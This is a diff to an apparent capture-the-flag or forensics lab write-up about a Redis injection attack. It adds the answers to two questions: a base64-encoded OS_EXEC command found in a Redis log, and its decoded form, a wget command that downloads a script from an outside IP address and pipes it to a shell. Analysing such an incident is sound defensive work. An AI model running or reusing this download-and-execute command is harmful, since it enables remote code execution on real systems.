@@ -122,13 +122,15 @@ Scrolling down in search for the last one, we found this.
 
 Q14: Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?
 
-A: 
+A: OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
 
 As per the question, we check the redis.log file and find this weird command.
 
-
+![](../../Img/Pasted%20image%2020250429155939.png)
 
 Q15: Once decoded, what is the command?
 
-A: 
+A: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
+
+I opened cyberchef 
 
